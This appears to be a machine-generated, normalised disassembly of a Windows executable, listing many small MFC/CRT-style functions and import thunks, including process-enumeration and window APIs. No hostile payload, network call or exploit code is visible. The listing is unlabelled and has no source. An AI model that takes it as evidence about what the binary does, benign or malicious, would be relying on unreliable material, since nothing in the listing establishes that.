push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_413cac
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_413cc8
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_41423e
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax * 4 + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_4149ea
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_4149fb
add esp 0xc
retn
sub_414aea
mov eax [ esp + 0x8 ]
and eax 0xfff7ffff
push eax
push [ esp + 0x8 ]
call sub_414ab5
pop ecx
pop ecx
retn
sub_4150bb
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_414f4f
add esp 0xc
retn
sub_4150d1
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_414f4f
add esp 0xc
retn
sub_4152ca
push 0x2
call sub_40cb90
pop ecx
retn
sub_4165a5
push 0x1
pop eax
retn
sub_416614
push 0x1
pop eax
retn
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
GetFileTitleA
jmp [ GetFileTitleA@IAT ]
ClosePrinter
jmp [ ClosePrinter@IAT ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
Ordinal_oledlg_8
jmp [ Ordinal_oledlg_8@IAT ]
sub_416900
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
xor ecx ecx
mov cx [ rw-data ]
push ecx
push eax
call [ GetPropA@IAT ]
retn
xor eax eax
retn
sub_417000
mov eax [ esp + 0x4 ]
push 0x0
push eax
call sub_417010
retn 0x4
sub_417220
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
push 0x0
push 0x0
push 0xffff
push eax
call sub_418500
add esp 0x10
retn 0x4
xor eax eax
retn 0x4
sub_417620
push esi
push rw-data
call [ EnterCriticalSection@IAT ]
push 0x0
call sub_417c70
add esp 0x4
mov esi eax
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax esi
pop esi
retn
sub_418320
cmp [ rw-data ] 0x35f
jb r-xdata
mov eax [ esp + 0x8 ]
and eax 0xffffffdf
cmp ax 0x9
ja r-xdata
xor eax eax
retn
xor eax eax
retn
mov eax 0x1
retn
sub_419720
mov eax [ esp + 0x10 ]
push 0x2
mov ecx [ esp + 0x10 ]
push eax
mov edx [ esp + 0x10 ]
push ecx
mov eax [ esp + 0x10 ]
push edx
push eax
call sub_4195d0
add esp 0x14
retn 0x10
sub_419980
mov eax [ esp + 0x10 ]
push 0x1
mov ecx [ esp + 0x10 ]
push eax
mov edx [ esp + 0x10 ]
push ecx
mov eax [ esp + 0x10 ]
push edx
push eax
call sub_419750
add esp 0x14
retn 0x10
sub_419c76
or [ ecx ] ecx
pop es
or [ ecx ] ecx
or [ eax ] ecx
or [ eax ] cl
int3
sub_41a037
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_420985
retn 0x10
sub_41a04f
call sub_422d64
mov ecx [ esp + 0x4 ]
test ecx ecx
mov [ eax + 0x14 ] cl
jne r-xdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call sub_40db3a
pop ecx
sub_41a06d
push 0x1
push 0x0
call sub_42368a
call sub_42385b
jmp sub_4236a4
j_sub_41a085
jmp sub_41a085
sub_41a085
push 0x600
push 0x0
call sub_41a04f
push sub_41a06d
call sub_40bc2c
pop ecx
mov [ rw-data ] al
retn
sub_41a3aa
mov ecx [ esp + 0x4 ]
lea eax [ esp + 0xc ]
push eax
push [ esp + 0xc ]
call sub_41a0a2
retn
sub_41a53f
mov eax r--data
retn
sub_41a545
push esi
mov esi ecx
push 0x1
call sub_41e817
test eax eax
je r-xdata
pop esi
retn
mov ecx esi
call sub_41cb32
j_sub_41cb32
jmp sub_41cb32
sub_41a561
call sub_41cb32
retn 0x4
sub_41a569
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
retn 0x4
sub_41a57b
push 0x1
pop eax
retn 0x4
sub_41a581
xor eax eax
retn 0x4
sub_41a5fe
mov ecx [ ebp - 0x14 ]
call sub_41f64a
mov eax sub_41a60c
retn
sub_41a60c
mov eax 0x8000ffff
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_41a657
mov ecx [ ebp - 0x14 ]
call sub_41f64a
mov eax sub_41a665
retn
sub_41a665
mov eax 0x8000ffff
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_41a6d7
mov ecx [ ebp + 0x8 ]
call sub_41f64a
mov eax sub_41a6e5
retn
sub_41a6e5
mov eax 0x8000ffff
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x14
sub_41a6fb
mov eax 0x80004001
retn 0xc
sub_41a703
mov eax 0x80004001
retn 0x18
sub_41a70b
mov eax 0x80004001
retn 0x8
sub_41a713
mov eax 0x80004001
retn 0x4
sub_41a71b
mov eax ecx
xor ecx ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x14 ] ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x18 ] ecx
retn 0x4
sub_41a73e
push esi
mov esi ecx
call sub_41a77a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_41a77a
mov eax sub_426598
call sub_40cc20
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_41a75a
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_41a7fb
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_41a75a
sub_41a8bb
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
add eax 0x4
push eax
call sub_41b806
pop ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov [ ecx ] eax
retn 0xc
sub_41a8db
test ecx ecx
je r-xdata
retn
push esi
mov esi [ ecx ]
push ecx
call sub_41b82f
pop ecx
test esi esi
mov ecx esi
jne r-xdata
pop esi
sub_41a918
push esi
mov esi ecx
call sub_41a9a4
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_41a9a4
mov eax sub_426558
call sub_40cc20
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_41a979
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_41aa1a
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_41a979
sub_41ab9c
mov eax r--data
retn
sub_41adfd
cmp [ ecx + 0x24 ] 0x0
je r-xdata
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_41aee7
mov eax [ ecx + 0x38 ]
retn
sub_41b2e0
mov eax [ ecx + 0x20 ]
test eax eax
jne r-xdata
retn
mov eax [ ecx + 0x1c ]
test eax eax
jne r-xdata
call [ GetActiveWindow@IAT ]
push eax
call sub_41cbcb
sub_41b33b
mov eax ecx
push 0x1
pop ecx
xor edx edx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
retn
sub_41b596
push 0x1
pop eax
retn 0x4
sub_41b59c
xor eax eax
retn
sub_41b59f
mov eax 0x80029c4a
retn 0x8
sub_41b5a7
call sub_422d64
mov eax [ eax + 0x4 ]
push 0x1
mov ecx eax
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_41b5bc
call sub_422d64
mov eax [ eax + 0x4 ]
push 0xffffffff
mov ecx eax
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_41b5d1
mov eax r--data
retn
sub_41b5d7
mov eax r--data
retn
sub_41b5dd
mov eax r--data
retn
sub_41b5e3
mov eax r--data
retn
sub_41b61b
mov eax r--data
retn
sub_41b621
mov eax r--data
retn
sub_41b7ec
call sub_41a429
xor eax eax
retn
sub_41b874
mov eax r--data
retn
sub_41b998
push esi
mov esi ecx
call sub_41b9b4
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_41bb7b
mov ecx [ ebp - 0x2c ]
call sub_41f64a
mov eax [ ebp - 0x24 ]
or [ eax + 0x2c ] 0xffffffff
mov eax r-xdata
retn
sub_41bc1f
mov eax [ esp + 0x4 ]
push 0x1
mov [ ecx + 0x58 ] eax
pop eax
retn 0x4
sub_41bdda
mov ecx [ ebp - 0x24 ]
call sub_41f64a
mov eax [ ebp - 0x1c ]
or [ eax + 0x2c ] 0xffffffff
mov eax r-xdata
retn
sub_41be41
push esi
mov esi ecx
test [ esi + 0x24 ] 0x18
je r-xdata
push [ esp + 0x8 ]
push [ esi + 0x1c ]
call [ EndDialog@IAT ]
pop esi
retn 0x4
mov eax [ esi ]
push [ esp + 0x8 ]
call [ eax + 0x74 ]
sub_41bfcb
push esi
mov esi ecx
push 0x1
call sub_41e817
test eax eax
je r-xdata
pop esi
retn
push 0x1
mov ecx esi
call sub_41be41
sub_41bfe4
push 0x2
call sub_41be41
retn
sub_41c068
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_41e737
retn 0xc
sub_41c0ba
mov eax [ ecx + 0x3c ]
test eax eax
je r-xdata
xor eax eax
add eax 0x20000
jmp r-xdata
retn 0x8
sub_41c100
call sub_41c10a
jmp sub_41c119
sub_41c10a
push 0x40
push 0x50
mov ecx rw-data
call sub_40b66a
retn
sub_41c119
push sub_41c125
call sub_40bc2c
pop ecx
retn
sub_41c125
mov ecx rw-data
jmp sub_40b692
sub_41c12f
call sub_41c139
jmp sub_41c14b
sub_41c139
push 0x40
push 0x90
mov ecx rw-data
call sub_40b66a
retn
sub_41c14b
push sub_41c157
call sub_40bc2c
pop ecx
retn
sub_41c157
mov ecx rw-data
jmp sub_40b692
sub_41c161
call sub_41c16b
jmp sub_41c17d
sub_41c16b
push 0x40
push 0x110
mov ecx rw-data
call sub_40b66a
retn
sub_41c17d
push sub_41c189
call sub_40bc2c
pop ecx
retn
sub_41c189
mov ecx rw-data
jmp sub_40b692
sub_41c193
call sub_41c19d
jmp sub_41c1af
sub_41c19d
push 0x40
push 0x210
mov ecx rw-data
call sub_40b66a
retn
sub_41c1af
push sub_41c1bb
call sub_40bc2c
pop ecx
retn
sub_41c1bb
mov ecx rw-data
jmp sub_40b692
sub_41c2c0
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
pop esi
retn 0x4
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx esi
call sub_41c247
sub_41c2e3
mov eax [ ecx ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
retn
cmp [ eax - 0xc ] 0x0
jl r-xdata
push rw-data
call sub_41c49d
jmp sub_41c28f
sub_41c5a2
lea eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
push 0x1
call sub_41c543
mov eax esi
pop esi
retn 0x4
sub_41c5b7
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov eax [ eax ]
push eax
push [ eax - 0x8 ]
call sub_41c543
mov eax esi
pop esi
retn 0x4
j_sub_41c6a1
jmp sub_41c6a1
sub_41c6a1
push r--data
call [ RegisterWindowMessageA@IAT ]
mov [ rw-data ] eax
retn
sub_41c6b2
call sub_41c6bc
jmp sub_41c6c9
sub_41c6bc
push 0x0
mov ecx rw-data
call sub_41c7e8
retn
sub_41c6c9
push sub_41c6d5
call sub_40bc2c
pop ecx
retn
sub_41c6d5
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_41d23d
sub_41c6f0
call sub_41c6fa
jmp sub_41c707
sub_41c6fa
push 0x1
mov ecx rw-data
call sub_41c7e8
retn
sub_41c707
push sub_41c713
call sub_40bc2c
pop ecx
retn
sub_41c713
test [ rw-data ] 0x2
jne r-xdata
retn
or [ rw-data ] 0x2
mov ecx rw-data
jmp sub_41d23d
sub_41c72e
call sub_41c738
jmp sub_41c745
sub_41c738
push 0xffffffff
mov ecx rw-data
call sub_41c7e8
retn
sub_41c745
push sub_41c751
call sub_40bc2c
pop ecx
retn
sub_41c751
test [ rw-data ] 0x4
jne r-xdata
retn
or [ rw-data ] 0x4
mov ecx rw-data
jmp sub_41d23d
sub_41c76c
call sub_41c776
jmp sub_41c783
sub_41c776
push 0xfffffffe
mov ecx rw-data
call sub_41c7e8
retn
sub_41c783
push sub_41c78f
call sub_40bc2c
pop ecx
retn
sub_41c78f
test [ rw-data ] 0x8
jne r-xdata
retn
or [ rw-data ] 0x8
mov ecx rw-data
jmp sub_41d23d
sub_41c7cc
push esi
mov esi ecx
call sub_41d23d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_41c863
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0xfffffff0
push [ esp + 0x14 ]
call sub_41c814
retn 0x10
sub_41c87d
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0xffffffec
push [ esp + 0x14 ]
call sub_41c814
retn 0x10
sub_41c897
push esi
mov esi [ esp + 0x8 ]
push [ esp + 0xc ]
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov ecx esi
call sub_41f19d
mov ecx [ esp + 0x10 ]
pop esi
mov [ ecx ] eax
retn 0xc
sub_41cbf2
push 0x0
call sub_41cb59
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_41aa65
sub_41d1d1
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x28 ] 0x0
jne r-xdata
push 0x1
pop eax
pop esi
retn 0x4
push 0x1
call sub_41ee1c
mov [ esi + 0x28 ] r--data
sub_41d3e9
retn
sub_41d3ea
cmp [ ecx + 0x1c ] 0x0
mov eax [ ecx ]
je r-xdata
jmp [ eax + 0xa4 ]
jmp [ eax + 0x58 ]
sub_41d48f
lea eax [ ecx + 0x28 ]
retn
sub_41d493
push esi
mov esi ecx
call sub_422d64
mov eax [ eax + 0x1034 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn 0x4
push esi
push [ esp + 0xc ]
call eax
sub_41d5e1
mov eax [ esp + 0x8 ]
push esi
push 0x0
mov esi ecx
push [ eax + 0xc ]
call sub_41e27d
test eax eax
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_41cb32
sub_41d8d0
mov eax r--data
retn
sub_41decc
push esi
mov esi ecx
call sub_41b627
mov [ esi ] r--data
mov [ esi + 0x28 ] 0x1
mov eax esi
pop esi
retn
sub_41dee5
mov eax [ esp + 0x4 ]
mov [ ecx + 0x18 ] 0x1
mov [ ecx + 0x28 ] eax
retn 0x4
sub_41e1de
xor eax eax
retn 0x4
sub_41e491
cmp [ esp + 0x4 ] 0x0
jne r-xdata
xor eax eax
retn 0x8
call sub_422b32
test [ eax + 0xdf ] 0x40
jne r-xdata
push 0x1
call sub_41d4b2
sub_41e80f
mov eax 0xffff
retn 0x8
sub_41e875
mov eax r-xdata
retn
sub_41e87b
mov esi [ ebp - 0x1c ]
push 0xf108
push 0x30
mov ecx esi
mov eax [ esi ]
call [ eax + 0x10 ]
mov ecx esi
call sub_41f64a
mov eax r-xdata
retn
sub_41e8b9
mov eax ecx
mov ecx [ esp + 0x8 ]
and [ eax + 0x8 ] 0x0
mov [ eax ] ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
retn 0x8
sub_41ea84
push 0x1
pop eax
retn
sub_41ed39
mov eax [ ecx + 0x24 ]
and eax 0x10
retn
sub_41f0d3
mov eax [ ecx + 0x90 ]
test eax eax
je r-xdata
xor eax eax
retn
cmp eax 0xe002
je r-xdata
cmp eax 0xe001
je r-xdata
push 0x1
pop eax
retn
sub_41f11a
push [ esp + 0x4 ]
mov ecx rw-data
call sub_40b75d
retn
sub_41f129
push [ esp + 0xc ]
mov ecx [ ecx + 0x34 ]
push [ esp + 0xc ]
mov eax [ ecx ]
push [ esp + 0xc ]
call [ eax + 0x54 ]
retn 0xc
sub_41f19d
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x70 ]
push 0xfffffff0
push [ ecx + 0x1c ]
call [ GetWindowLongA@IAT ]
retn
sub_41f1b7
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x74 ]
push 0xffffffec
push [ ecx + 0x1c ]
call [ GetWindowLongA@IAT ]
retn
sub_41f1d1
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0x80 ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ SetWindowTextA@IAT ]
jmp r-xdata
retn 0x4
sub_41f227
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x90 ]
push [ ecx + 0x1c ]
call [ GetDlgCtrlID@IAT ]
retn
sub_41f2d2
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0xa0 ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ ShowWindow@IAT ]
jmp r-xdata
retn 0x4
sub_41f2f9
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0xa4 ]
push [ ecx + 0x1c ]
call [ IsWindowEnabled@IAT ]
retn
sub_41f314
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0xa8 ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
jmp r-xdata
retn 0x4
sub_41f33b
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0xac ]
push [ ecx + 0x1c ]
call [ SetFocus@IAT ]
push eax
call sub_41cbcb
retn
sub_41f383
cmp [ ecx + 0x38 ] 0x0
je r-xdata
retn 0xc
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0x2
push [ esp + 0x14 ]
push ecx
call sub_41f35c
add esp 0x18
sub_41f52d
push 0x1
call sub_41f4bb
mov ecx eax
push [ esp + 0x4 ]
call sub_41f8b5
retn 0x4
sub_41f542
push 0x0
call sub_41f4bb
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_41aa65
sub_41f58a
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_41f560
push eax
call [ DestroyMenu@IAT ]
retn
xor eax eax
retn
sub_41f5a0
retn 0x4
sub_41f5b5
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
call sub_41f5a3
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
retn
sub_41f60d
mov ecx [ ebp - 0x18 ]
call sub_41f64a
mov eax r-xdata
retn
sub_41f61b
test ecx ecx
je r-xdata
xor eax eax
cmp ecx [ esp + 0x4 ]
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx [ ecx + 0x10 ]
jmp sub_41f61b
retn 0x4
sub_41f634
mov eax ecx
mov [ eax + 0x4 ] 0x1
retn
sub_41f63e
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
retn 0x4
sub_41f64a
cmp [ ecx + 0x4 ] 0x0
jle r-xdata
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_41f74d
call sub_422d8a
inc [ eax + 0x10 ]
retn
sub_41fa68
mov eax [ ecx ]
test eax eax
je r-xdata
retn
push eax
call [ GlobalFree@IAT ]
sub_41fa76
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_41fda4
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0xc ] ecx
or [ eax + 0x4 ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_41fdbe
push esi
mov esi ecx
call sub_41fdf9
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_41fdda
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x4 ]
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
retn 0x4
sub_4200b0
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
je r-xdata
retn
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
push eax
call [ GetLastError@IAT ]
push eax
call sub_4205db
sub_420112
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
lea ecx [ esi + 0xc ]
call sub_41c2e3
pop esi
retn
push eax
call [ CloseHandle@IAT ]
or [ esi + 0x4 ] 0xffffffff
sub_4201dd
xor eax eax
retn 0x10
sub_4205db
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x8
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ esp + 0xc ]
call sub_420707
push eax
call sub_42069c
sub_4209fb
mov eax [ ecx + 0x1c ]
push 0x0
push 0x0
push 0x10
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
retn
sub_420a0e
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_420a22
push esi
mov esi ecx
call sub_420b2d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_420ab0
push 0x1
call sub_420a3e
mov ecx eax
push [ esp + 0x4 ]
call sub_41f8b5
retn 0x4
sub_420b63
mov eax [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
retn 0x4
sub_420b6d
mov eax [ esp + 0x4 ]
mov [ ecx + 0x4 ] eax
retn 0x4
sub_420b77
and [ ecx + 0x8 ] 0x0
retn
sub_420b7c
and [ ecx + 0x4 ] 0x0
retn
sub_420ede
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ GetClipBox@IAT ]
retn 0x4
sub_421016
push esi
mov esi ecx
call sub_421032
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_4210ca
push esi
mov esi ecx
call sub_4210e6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_42117e
push esi
mov esi ecx
call sub_42119a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_421253
push 0x1
call sub_4211e1
mov ecx eax
push [ esp + 0x4 ]
call sub_41f8b5
retn 0x4
sub_421292
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_421268
push eax
call [ DeleteObject@IAT ]
retn
xor eax eax
retn
sub_4212a8
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push r--data
push eax
mov [ ebp - 0x4 ] rw-data
call sub_40da39
sub_421403
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn 0x4
push eax
call [ DeleteObject@IAT ]
and [ esi ] 0x0
sub_421608
push esi
mov esi ecx
call sub_4217b5
and [ esi + 0x20 ] 0x0
pop esi
retn
sub_4218d4
mov ecx [ ecx + 0x80 ]
test ecx ecx
je r-xdata
push 0x1
pop eax
retn
mov eax [ ecx ]
jmp [ eax + 0x20 ]
sub_421bc0
call sub_422b32
mov eax [ eax + 0xc4 ]
retn
sub_421d16
push esi
mov esi ecx
call sub_421d6e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_421dba
push [ esp + 0x4 ]
call sub_40bb22
pop ecx
retn 0x4
sub_421dc7
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_40c532
pop ecx
pop ecx
retn 0x8
sub_421dfe
push [ esp + 0x4 ]
call sub_40c218
pop ecx
retn 0x4
sub_421e0b
mov eax [ ecx + 0x14 ]
retn
sub_421f54
retn
sub_421f7f
mov eax [ ecx ]
jmp [ eax + 0x4c ]
sub_422174
lea eax [ esp + 0xc ]
push 0x1
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_42203b
retn 0xc
sub_42218b
call sub_422d64
xor ecx ecx
cmp [ eax + 0x2c ] ecx
sete cl
mov eax ecx
retn
sub_42219b
call sub_422d64
mov eax [ eax + 0x30 ]
retn
sub_4221a4
jmp r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov eax 0x80000000
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
j_sub_4221cc
jmp sub_4221cc
sub_422211
push rw-data
call sub_421403
retn
j_sub_422221
jmp sub_422221
sub_422221
push sub_422211
call sub_40bc2c
pop ecx
mov [ rw-data ] al
retn
sub_42234e
mov eax ecx
mov [ eax ] r--data
retn
sub_422357
push esi
mov esi ecx
call sub_4259e0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_423161
sub_42245c
push esi
mov esi ecx
call sub_4224bc
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_4224b8
push 0x1
pop eax
retn
sub_422658
mov eax r--data
retn
sub_42265e
call sub_422668
jmp sub_422669
sub_422668
retn
sub_422669
push sub_422675
call sub_40bc2c
pop ecx
retn
sub_422675
mov ecx rw-data
jmp sub_42408a
sub_4226b0
push esi
mov esi ecx
call sub_425a30
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41b82f
pop ecx
sub_42273b
mov eax r--data
retn
sub_422775
push 0x30
call sub_423143
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_42278a
push 0x4
call sub_423143
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_42279f
push esi
mov esi ecx
call sub_423a51
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_423161
sub_4227ba
push esi
mov esi ecx
call sub_423a92
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_423161
sub_4228b5
mov eax r--data
retn
sub_4228bb
mov eax r--data
retn
sub_422972
mov eax r--data
retn
sub_4229aa
mov eax r--data
retn
sub_4229f0
push esi
mov esi ecx
call j_sub_41d23d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_40b75d
j_sub_41d23d
jmp sub_41d23d
sub_422a15
mov eax r--data
retn
sub_422a1b
call sub_422a25
jmp sub_422a34
sub_422a25
push 0x40
push 0x3c
mov ecx rw-data
call sub_40b66a
retn
sub_422a34
push sub_422a40
call sub_40bc2c
pop ecx
retn
sub_422a40
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_40b692
sub_422a8c
mov eax ecx
or [ eax + 0xd4 ] 0xffffffff
or [ eax + 0x104 ] 0xffffffff
mov [ eax ] r--data
retn
sub_422aa3
push esi
mov esi ecx
call sub_422abe
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_423161
sub_422b32
push sub_422741
mov ecx rw-data
call sub_423575
retn
sub_422b42
call sub_422b4c
jmp sub_422b4d
sub_422b4c
retn
sub_422b4d
push sub_422b59
call sub_40bc2c
pop ecx
retn
sub_422b59
mov ecx rw-data
jmp j_sub_4235ec
sub_422bc6
push esi
mov esi ecx
call sub_422be1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
